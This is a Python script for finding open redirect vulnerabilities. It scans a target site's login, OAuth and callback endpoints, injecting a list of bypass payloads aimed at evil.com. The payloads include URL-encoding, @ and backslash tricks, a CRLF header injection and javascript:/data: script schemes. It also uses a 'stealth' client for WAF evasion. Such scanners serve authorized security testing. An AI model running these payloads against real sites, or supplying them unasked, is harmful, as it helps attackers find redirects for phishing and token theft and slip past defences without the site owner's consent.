#!/usr/bin/env python3
"""Open Redirect Vulnerability Tester

Tests for open redirect vulnerabilities:
- URL parameter manipulation
- Header-based redirects
- Meta refresh redirects
- JavaScript-based redirects
- Protocol confusion (javascript:, data:, etc.)
"""

from typing import Dict, Any, List, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote

import requests  # Always import for Session/exceptions support

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)


# Common redirect parameter names
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri",
    "next", "next_url", "return", "return_url", "returnTo",
    "goto", "go", "target", "target_url", "dest", "destination",
    "redir", "redirect_to", "continue", "forward", "forward_url",
    "link", "to", "view", "ref", "referer", "referrer",
    "out", "callback", "callback_url", "checkout_url",
    "success_url", "failure_url", "cancel_url", "error_url",
    "login_url", "logout_url", "site", "site_url",
    "path", "data", "image_url", "file", "load",
]

# Endpoints commonly vulnerable to open redirect
REDIRECT_ENDPOINTS = [
    "/login", "/signin", "/auth", "/oauth",
    "/logout", "/signout",
    "/redirect", "/redir", "/go", "/out", "/link",
    "/external", "/forward", "/proxy",
    "/callback", "/return", "/success", "/complete",
    "/api/redirect", "/api/oauth/callback",
]

# Evil destinations for testing
EVIL_DESTINATIONS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "https://evil.com/",
]

# Bypass payloads
BYPASS_PAYLOADS = [
    # Basic
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    
    # URL encoding
    "https:%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "%2F%2Fevil.com",
    
    # Double URL encoding
    "https%253A%252F%252Fevil.com",
    
    # Backslash confusion
    "https://evil.com\\@target.com",
    "https://target.com\\@evil.com",
    
    # @ symbol bypass
    "https://target.com@evil.com",
    "https://evil.com%40target.com",
    
    # Protocol-relative
    "//evil.com",
    "\\/\\/evil.com",
    "/\\/evil.com",
    
    # CRLF injection
    "https://target.com%0d%0aLocation:%20https://evil.com",
    
    # Null byte
    "https://evil.com%00.target.com",
    
    # Unicode normalization
    "https://evil。com",  # Fullwidth period
    "https://ⅇvil.com",  # Unicode variants
    
    # Path confusion
    "/\\evil.com",
    "//\\evil.com",
    
    # Scheme confusion
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)",
    
    # Hostname confusion
    "https://evil.com#.target.com",
    "https://evil.com?.target.com",
    "https://target.com.evil.com",
    
    # IPv4 and IPv6
    "https://167772161",  # Decimal IP for 10.0.0.1
    "https://[::ffff:0a00:0001]",  # IPv6 mapped
    
    # Whitespace bypass
    " https://evil.com",
    "https://evil.com ",
    "\thttps://evil.com",
]


def is_redirect_to_evil(response: requests.Response, evil_domain: str = "evil.com") -> bool:
    """Check if response redirects to evil domain.
    
    Args:
        response: Response object to analyze
        evil_domain: Domain to check for
    
    Returns:
        True if redirect to evil domain detected
    """
    # Check redirect chain
    for hist in response.history:
        location = hist.headers.get("Location", "")
        if evil_domain in location:
            return True
    
    # Check final Location header
    location = response.headers.get("Location", "")
    if evil_domain in location:
        return True
    
    # Check final URL
    if evil_domain in response.url:
        return True
    
    # Check for meta refresh
    content = response.text.lower()
    if f'url={evil_domain}' in content or f"url='{evil_domain}" in content or f'url="{evil_domain}' in content:
        return True
    
    # Check for JavaScript redirect
    if f'location.href="{evil_domain}' in content or f"location.href='{evil_domain}" in content:
        return True
    if f'location="{evil_domain}' in content or f"location='{evil_domain}" in content:
        return True
    if f'window.location="{evil_domain}' in content or f"window.location='{evil_domain}" in content:
        return True
    
    return False


def test_redirect_param(
    url: str,
    param: str,
    payload: str,
    timeout: int = 10
) -> Dict[str, Any]:
    """Test a specific parameter with a redirect payload.
    
    Args:
        url: Base URL
        param: Parameter name
        payload: Redirect payload
        timeout: Request timeout
    
    Returns:
        Dict with test results
    """
    result = {
        "test": "redirect_param",
        "url": url,
        "param": param,
        "payload": payload,
        "vulnerable": False,
        "evidence": None,
    }
    
    try:
        # Build test URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = payload
        
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if params:
            test_url += "?" + urlencode(params, doseq=True)
        
        # Make request (don't follow redirects to analyze them)
        resp = safe_get(test_url, timeout=timeout, allow_redirects=False)
        
        # Check for redirect
        if resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("Location", "")
            
            # Check if redirects to our payload
            if "evil" in location.lower():
                result["vulnerable"] = True
                result["evidence"] = f"Redirect to: {location}"
                result["redirect_location"] = location
            elif payload.replace("https://", "").replace("http://", "").replace("//", "") in location:
                result["vulnerable"] = True
                result["evidence"] = f"Redirect to: {location}"
                result["redirect_location"] = location
        
        # Check response body for client-side redirects
        if "evil" in resp.text.lower():
            if "location" in resp.text.lower() or "redirect" in resp.text.lower():
                result["vulnerable"] = True
                result["evidence"] = "Potential client-side redirect detected"
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def discover_redirect_params(url: str, timeout: int = 10) -> List[str]:
    """Discover redirect parameters on a page.
    
    Args:
        url: URL to analyze
        timeout: Request timeout
    
    Returns:
        List of parameter names
    """
    found_params = []
    
    try:
        # Get parameters from URL
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        found_params.extend(query_params.keys())
        
        # Get page and look for forms/links
        resp = safe_get(url, timeout=timeout)
        content = resp.text.lower()
        
        # Look for redirect-related parameters in forms
        import re
        for param in REDIRECT_PARAMS:
            if f'name="{param}"' in content or f"name='{param}'" in content:
                if param not in found_params:
                    found_params.append(param)
            if f'name={param}' in content:
                if param not in found_params:
                    found_params.append(param)
        
        # Look for parameters in links
        link_pattern = r'href=["\'][^"\']*[?&](' + '|'.join(REDIRECT_PARAMS) + r')='
        matches = re.findall(link_pattern, content, re.IGNORECASE)
        for match in matches:
            if match not in found_params:
                found_params.append(match)
        
    except Exception:
        pass
    
    # Add common params if none found
    if not found_params:
        found_params = ["url", "redirect", "next", "return", "goto", "target", "redir"]
    
    return found_params


def discover_redirect_endpoints(base_url: str, timeout: int = 10) -> List[str]:
    """Discover endpoints that may have redirect functionality.
    
    Args:
        base_url: Base URL to scan
        timeout: Request timeout
    
    Returns:
        List of discovered URLs
    """
    discovered = []
    
    for endpoint in REDIRECT_ENDPOINTS:
        test_url = urljoin(base_url, endpoint)
        try:
            resp = safe_get(test_url, timeout=timeout, allow_redirects=False)
            # Include if endpoint exists (not 404)
            if resp.status_code != 404:
                discovered.append(test_url)
        except:
            continue
    
    return discovered


def validate_open_redirect(
    target_url: str,
    endpoints: Optional[List[str]] = None,
    discovery_data: Optional[Dict] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """Run comprehensive open redirect testing.
    
    Args:
        target_url: Base URL to test
        endpoints: Optional list of specific endpoints to test
        discovery_data: Optional discovery data with endpoints
        timeout: Request timeout
    
    Returns:
        Dict with all test results
    """
    result = {
        "target": target_url,
        "vulnerable": False,
        "vulnerable_endpoints": [],
        "tests": [],
        "findings": [],
    }
    
    # Get endpoints to test
    if endpoints:
        test_endpoints = endpoints
    elif discovery_data and discovery_data.get("endpoints"):
        test_endpoints = [urljoin(target_url, ep) for ep in discovery_data["endpoints"]]
    else:
        test_endpoints = discover_redirect_endpoints(target_url, timeout)
    
    if not test_endpoints:
        test_endpoints = [target_url]
    
    # Test each endpoint
    for endpoint in test_endpoints[:10]:  # Limit to 10 endpoints
        # Discover redirect parameters for this endpoint
        params = discover_redirect_params(endpoint, timeout)
        
        for param in params[:5]:  # Limit to 5 params per endpoint
            # Test common payloads
            for payload in BYPASS_PAYLOADS[:10]:  # Limit payloads
                redirect_test = test_redirect_param(endpoint, param, payload, timeout)
                result["tests"].append(redirect_test)
                
                if redirect_test.get("vulnerable"):
                    result["vulnerable"] = True
                    
                    # Check if this is a novel finding
                    existing = [f for f in result["findings"] 
                               if f["url"] == endpoint and f["param"] == param]
                    
                    if not existing:
                        result["vulnerable_endpoints"].append(endpoint)
                        
                        # Determine severity
                        # High if protocol bypass or @-based attack
                        if "javascript:" in payload or "@" in payload:
                            severity = "high"
                        # Medium for standard redirects
                        elif payload.startswith("//") or "evil.com" in payload:
                            severity = "medium"
                        else:
                            severity = "low"
                        
                        result["findings"].append({
                            "type": "open_redirect",
                            "url": endpoint,
                            "param": param,
                            "payload": payload,
                            "evidence": redirect_test.get("evidence", ""),
                            "severity": severity,
                            "redirect_location": redirect_test.get("redirect_location"),
                        })
                    break  # Move to next param after finding vulnerability
    
    return result


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python open_redirect_tester.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Testing open redirect on: {target}")
    
    results = validate_open_redirect(target)
    
    print(f"\n[*] Results:")
    print(f"  Vulnerable: {results['vulnerable']}")
    print(f"  Vulnerable Endpoints: {len(results['vulnerable_endpoints'])}")
    
    for finding in results.get("findings", []):
        print(f"\n  Finding: {finding['type']} ({finding['severity']})")
        print(f"    URL: {finding['url']}")
        print(f"    Parameter: {finding['param']}")
        print(f"    Payload: {finding['payload'][:50]}...")
        print(f"    Evidence: {finding.get('evidence', 'N/A')}")

